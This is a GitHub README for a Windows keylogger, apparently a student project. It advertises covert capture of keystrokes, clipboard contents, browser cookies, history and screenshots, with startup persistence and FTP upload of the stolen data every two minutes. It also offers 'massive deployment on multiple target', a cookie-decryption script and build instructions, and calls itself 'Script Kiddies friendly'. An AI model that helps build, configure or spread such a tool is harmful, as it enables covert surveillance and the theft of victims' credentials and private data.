
# Keylogger

Simple key logger that can be launched by a built-in service or directly run winkey.exe.\
FTP uploads every 2 minutes in an organized format.\
See Feature for more details. (42 Project)


## Upload Settings

### Before compile, change DEFINE in .h file :

```
  -> Keylogger/inc/Keylloger.h
```

| Parameter | Type     | Description                |
| :-------- | :------- | :------------------------- |
| `FTP_HOST` | `Unicode string` | **Required**. FTP host name |
| `FTP_USERNAME` | `Unicode string` | **Required**. FTP username |
| `FTP_PASSWORD` | `Unicode string` | **Required**. FTP password |


## Decrypt cookies file

To decrypt encrypted cookie file, use this python script: [@GramThanos](https://gist.github.com/GramThanos/ff2c42bb961b68e7cc197d6685e06f10)


## Run Locally

Clone the project

```bash
  git clone https://github.com/Shad0cks/Keylogger.git
```

Change upload FTP defines

```bash
  Keylogger/inc/Keylloger.h
```

Open Visual Studio terminal

```bash
  nmake
```


## Features

📪  FTP Upload every 2 minutes

🍪 Keyboard / Clipboard / Cookies / History / Screenshot logs

🗂️ Organized data for massive deployment on multiple target

🪙 Support Opera / Chrome / Firefox

🔍 Tracking current process

🗿 Script Kiddies friendly

🛎️ Run at startup 

⚙️ Optional Service integrate

🦠 Easy use with virus.bat


## Screenshots

![App Screenshot](https://cdn.discordapp.com/attachments/880331064105648129/1068626946025607218/Capture_decran_2023-01-27_a_21.21.30.png)


## License

[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
